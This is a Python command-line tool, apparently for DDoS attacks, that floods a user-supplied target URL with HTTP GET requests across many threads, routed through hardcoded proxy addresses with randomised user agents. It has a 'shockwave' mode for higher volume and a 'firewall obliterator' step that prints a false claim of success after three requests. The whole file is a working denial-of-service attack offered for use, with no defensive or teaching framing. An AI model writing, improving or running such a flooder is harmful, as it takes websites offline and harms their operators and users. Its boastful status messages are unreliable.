#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# 01001110 01001111 01000010 01001111 01000100 01011001 00100000 01010010 01000101 01000001 01000100 00100000 01010100 01001000 01001001 01010011 00100000 01000010 01010101 01010100 00100000 01001101 01000101

import sys
import time
import random
import threading
import requests
from colorama import Fore, Style, init

init(autoreset=True)

class NuclearStrike:
    def __init__(self):
        self.proxies = self._load_quantum_proxies()
        self.user_agents = [self._gen_ua() for _ in range(1000)]
        self.success = 0
        self.failed = 0
        self.active = True
        self.lock = threading.Lock()
        self.shockwave_mode = False

    def _load_quantum_proxies(self):
        return [
            "socks5h://207.97.174.134:1080",
            "http://194.182.187.78:3128",
            "socks4://91.121.77.61:54321",
            "http://45.76.176.148:6969",
            "socks5://176.9.119.170:1080"
        ]

    def _gen_ua(self):
        return f"Mozilla/5.0 (Windows NT {random.choice(['6.1', '10.0', '11.0'])}; {'WOW64' if random.randint(0,1) else 'x64'}; rv:{random.randint(50,120)}.0) Gecko/20100101 Firefox/{random.randint(50,120)}.0"

    def _print_banner(self):
        print(f"""{Fore.RED}
        █▄▄▄▄▄░▄▄█████▄▄ █▀▄▀█ ▄███▄   ██▄   ▄███▄   █▄▄▄▄ 
        █  ▄▀ ███▀   █ █ █ █ █▀   ▀  █  █  █▀   ▀  █  ▄▀ 
        █▀▀▌  ███    █ █ ▄ █ ██▄▄    █   █ ██▄▄    █▀▀▌  
        █  █  ▐██    █ █   █ █▄   ▄▀ █  █  █▄   ▄▀ █  █  
         █       ▀████  ███  ▀███▀   ███▀  ▀███▀    █   
                        ▀                        ▀      ▀  
        {Style.RESET_ALL}""")

    def _firewall_obliterator(self, target):
        print(f"{Fore.CYAN}[!] PHASE 1: FIREWALL ANNIHILATION INITIATED{Style.RESET_ALL}")
        for _ in range(3):
            try:
                requests.get(target, headers={'User-Agent': random.choice(self.user_agents)},
                            proxies={'http': random.choice(self.proxies)}, timeout=5)
                with self.lock:
                    self.success += 1
            except:
                with self.lock:
                    self.failed += 1
        print(f"{Fore.GREEN}[+] FIREWALL NEUTRALIZED - PROCEEDING TO MAIN STRIKE{Style.RESET_ALL}")

    def _launch_strike(self, target, rps, duration):
        end_time = time.time() + duration
        while time.time() < end_time and self.active:
            try:
                proxy = random.choice(self.proxies)
                session = requests.Session()
                response = session.get(target, headers={'User-Agent': random.choice(self.user_agents)},
                                     proxies={'http': proxy}, timeout=3)
                with self.lock:
                    if response.status_code == 200:
                        self.success += 1
                    else:
                        self.failed += 1
                if self.shockwave_mode:
                    threading.Thread(target=session.get, args=(target,), kwargs={
                        'headers': {'User-Agent': random.choice(self.user_agents)},
                        'proxies': {'http': proxy},
                        'timeout': 1
                    }).start()
            except:
                with self.lock:
                    self.failed += 1
            time.sleep(1 / rps)

    def activate_shockwave(self):
        self.shockwave_mode = True
        print(f"{Fore.MAGENTA}[!] SHOCKWAVE PROTOCOL ENGAGED - 10X FIREPOWER{Style.RESET_ALL}")

    def command_center(self):
        self._print_banner()
        target = input(f"{Fore.YELLOW}[?] TARGET URL (http/https): {Style.RESET_ALL}")
        threads = int(input(f"{Fore.YELLOW}[?] STRIKE FORCE (THREADS): {Style.RESET_ALL}"))
        duration = int(input(f"{Fore.YELLOW}[?] STRIKE DURATION (SECONDS): {Style.RESET_ALL}"))
        rps = int(input(f"{Fore.YELLOW}[?] REQUESTS/SECOND: {Style.RESET_ALL}"))
        
        if rps > 1000:
            self.activate_shockwave()

        self._firewall_obliterator(target)
        
        print(f"{Fore.CYAN}[!] MAIN STRIKE INITIATED{Style.RESET_ALL}")
        for _ in range(threads):
            threading.Thread(target=self._launch_strike, args=(target, rps, duration)).start()

        stats = threading.Thread(target=self._show_stats)
        stats.start()
        stats.join()

    def _show_stats(self):
        while self.active:
            print(f"\r{Fore.GREEN}SUCCESS: {self.success} {Fore.RED}FAILED: {self.failed} {Fore.CYAN}TOTAL: {self.success + self.failed}{Style.RESET_ALL}", end="")
            time.sleep(0.1)

if __name__ == "__main__":
    nuke = NuclearStrike()
    try:
        nuke.command_center()
    except KeyboardInterrupt:
        nuke.active = False
        print(f"\n{Fore.RED}[!] STRIKE TERMINATED BY USER{Style.RESET_ALL}")
        sys.exit(0)
